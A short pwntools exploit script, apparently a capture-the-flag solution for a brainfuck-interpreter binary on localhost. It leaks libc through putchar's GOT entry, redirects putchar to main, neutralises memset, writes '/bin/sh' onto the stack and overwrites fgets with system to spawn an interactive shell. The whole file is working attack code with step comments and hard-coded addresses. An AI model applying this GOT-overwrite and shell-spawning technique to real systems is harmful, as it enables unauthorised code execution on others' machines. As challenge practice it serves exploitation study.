from pwn import *

'''
1. Leak libc offset
2. Overwrite putchar to main(0x08048671)
3. Neutralize memset with ret(0x08048792)
4. Put /bin/sh in the stack with fgets
5. Overwrite fgets to system(LIBC+0x0003f250)
'''

p = remote('localhost', 9001)

MAIN = 0x08048671
RET = 0x08048792

FGETS_GOT_PLT = 0x0804a010
MEMSET_GOT_PLT = 0x0804a02c
PUTCHAR_GOT_PLT = 0x0804a030

TAPE = 0x0804a0a0

PUTCHAR_OFFSET = 0x00068770
SYSTEM_OFFSET = 0x0003f250

payload = '.' # init putchar
payload += '<' * (TAPE - PUTCHAR_GOT_PLT) # cursor is now on putchar
payload += '.>.>.>.<<<' # leak putchar
payload += ',>,>,>,<<<' # overwrite putchar

payload += '<' * (PUTCHAR_GOT_PLT - MEMSET_GOT_PLT) # cursor is now on memset
payload += ',>,>,>,<<<' # overwrite memset
payload += '.' # call putchar and initialize stack

payload += '<' * (TAPE - FGETS_GOT_PLT) # cursor is now on fgets
payload += ',>,>,>,' # overwrite fgets to system
payload += '.' # call putchar - fgets(system) is called with /bin/sh

p.recvuntil('[ ]\n')
p.sendline(payload)

p.recvn(1)
libc = u32(p.recvn(4)) - PUTCHAR_OFFSET
log.success('libc is at 0x%x' % libc)
p.send(p32(MAIN))
p.send(p32(RET))

p.recvuntil('[ ]\n')
p.sendline('/bin/sh\x00')
p.send(p32(libc + SYSTEM_OFFSET))

p.interactive()

